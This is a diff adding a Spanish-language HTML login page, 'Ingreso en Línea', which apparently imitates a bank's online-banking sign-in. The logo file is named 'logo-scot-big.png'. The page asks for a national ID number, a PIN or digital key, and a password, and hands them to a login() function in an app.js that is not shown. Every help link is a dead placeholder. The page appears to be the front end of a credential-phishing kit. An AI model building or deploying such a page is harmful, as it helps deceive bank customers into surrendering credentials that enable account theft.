@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ingreso en Línea</title>
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+  />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #e30613;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .logo-container {
+      margin-top: 40px;
+      margin-bottom: 15px;
+    }
+
+    .logo-container img {
+      max-width: 180px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background-color: #fff;
+      border-top: 0;
+      border-bottom: 25px solid #e0e0e0;
+      border-radius: 4px;
+      box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
+      box-sizing: border-box;
+      overflow: hidden;
+    }
+
+    .header-bar {
+      background-color: #1a1a1a;
+      color: white;
+      text-align: center;
+      font-weight: bold;
+      padding: 14px 10px;
+      font-size: 15px;
+    }
+
+    .form-content {
+      padding: 25px 35px 20px 35px;
+    }
+
+    label {
+      display: block;
+      color: #333;
+      font-size: 14px;
+      margin-bottom: 6px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #333;
+      box-sizing: border-box;
+      margin-bottom: 15px;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    .btn {
+      background-color: #e30613;
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin-top: 5px;
+    }
+
+    .btn:hover {
+      background-color: #b00510;
+    }
+
+    .footer-links {
+      text-align: right;
+      font-size: 13px;
+      margin-top: 8px;
+    }
+
+    .footer-links a {
+      color: #e30613;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .register {
+      text-align: center;
+      font-size: 13px;
+      color: #333;
+      margin-top: 25px;
+    }
+
+    .register a {
+      color: #e30613;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .register a:hover {
+      text-decoration: underline;
+    }
+
+    .keyboard {
+      text-align: center;
+      font-size: 12px;
+      color: white;
+      margin: 25px 0 15px 0;
+    }
+
+    .keyboard a {
+      color: white;
+      text-decoration: underline;
+    }
+
+    #error-box {
+      display: none;
+      background: #ffe0e0;
+      color: #c20000;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 13px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Logo -->
+  <div class="logo-container">
+    <img src="logo-scot-big.png" alt="Logo" />
+  </div>
+
+  <!-- Formulario -->
+  <div class="container">
+    <div class="header-bar">
+      Completá los campos para acceder a tu cuenta
+    </div>
+
+    <div class="form-content">
+      <div id="error-box"></div>
+
+      <label for="usuario">Usuario</label>
+      <input
+        type="text"
+        id="usuario"
+        placeholder="Ingresá tu usuario habitual (C.I.)"
+        inputmode="numeric"
+        pattern="[0-9]*"
+      />
+
+      <label for="pin">Clave Digital (En caso de no tenerla, ingresá el PIN)</label>
+      <input
+        type="password"
+        id="pin"
+        placeholder="Ingresá tu PIN o Clave Digital"
+        inputmode="numeric"
+        pattern="[0-9]*"
+      />
+
+      <label for="contrasena">Contraseña</label>
+      <input
+        type="password"
+        id="contrasena"
+        placeholder="Ingresá tu contraseña"
+      />
+
+      <button class="btn" onclick="login()">INGRESAR</button>
+
+      <div class="footer-links">
+        <a href="#">¿Olvidaste tu PIN o contraseña?</a>
+      </div>
+
+      <div class="register">
+        Si aún no tenés usuario, <a href="#">hacé click aquí</a>.
+      </div>
+    </div>
+  </div>
+
+  <!-- Texto inferior -->
+  <div class="keyboard">
+    <a href="#">Utilizá el teclado virtual para mayor seguridad</a>
+  </div>
+
+  <!-- Enlace al JS (usar defer para evitar errores) -->
+  <script src="app.js" defer></script>
+</body>
+</html>
